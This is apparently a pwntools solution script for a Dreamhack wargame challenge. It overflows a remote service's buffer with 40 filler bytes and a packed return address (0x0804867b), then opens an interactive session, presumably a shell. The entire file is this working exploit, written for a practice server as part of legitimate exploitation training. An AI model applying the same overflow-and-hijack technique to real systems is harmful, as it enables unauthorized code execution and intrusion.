from pwn import *

p=remote("host3.dreamhack.games", "21540")


payload=b'a'*40+p32(0x0804867b) 
p.send(payload)
p.interactive()

p.interactive()

